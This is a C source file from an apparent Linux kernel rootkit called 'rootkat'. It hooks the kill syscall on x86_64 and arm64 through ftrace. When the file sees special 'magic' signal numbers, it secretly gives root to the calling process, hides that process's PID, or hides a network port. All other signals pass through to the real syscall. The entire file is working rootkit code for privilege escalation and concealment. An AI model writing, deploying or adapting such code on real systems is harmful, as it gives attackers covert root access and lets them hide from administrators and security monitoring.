// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/ptrace.h>
#include "arch_compat.h"
#include "ftrace_hook.h"
#include "magic_actions.h"
#include "hook_sys_kill.h"

#define TAG "rootkat/hook_sys_kill: "

/*
 * Hook target: __x64_sys_kill (x86_64) or __arm64_sys_kill (arm64) is
 * the syscall entry wrapper. It receives a single `struct pt_regs *`
 * and unpacks args itself. We mirror that signature so we can call the
 * original cleanly when the magic signal isn't present.
 */
static const char * const sys_kill_candidates[] = {
	"__x64_sys_kill",   /* x86_64 */
	"__arm64_sys_kill", /* arm64  */
	NULL,
};

typedef long (*sys_kill_t)(const struct pt_regs *regs);

static long rootkat_sys_kill(const struct pt_regs *regs);
static struct rootkat_hook hook_sys_kill = {
	.candidates  = sys_kill_candidates,
	.replacement = rootkat_sys_kill,
};

static long rootkat_sys_kill(const struct pt_regs *regs)
{
	sys_kill_t orig = (sys_kill_t)hook_sys_kill.original;
	int sig = (int)SYSCALL_ARG2(regs);
	pid_t arg1 = (pid_t)SYSCALL_ARG1(regs);

	if (sig == ROOTKAT_PRIVESC_SIG) {
		rootkat_grant_root_to_current();
		return 0;
	}
	if (sig == ROOTKAT_HIDE_SIG) {
		rootkat_hide_current_pid();
		return 0;
	}
	if (sig == ROOTKAT_HIDE_PORT_SIG) {
		rootkat_hide_port_from_current((u16)arg1);
		return 0;
	}

	return orig(regs);
}

int rootkat_hook_sys_kill_install(void)
{
	return rootkat_hook_install(&hook_sys_kill);
}

void rootkat_hook_sys_kill_remove(void)
{
	rootkat_hook_remove(&hook_sys_kill);
}
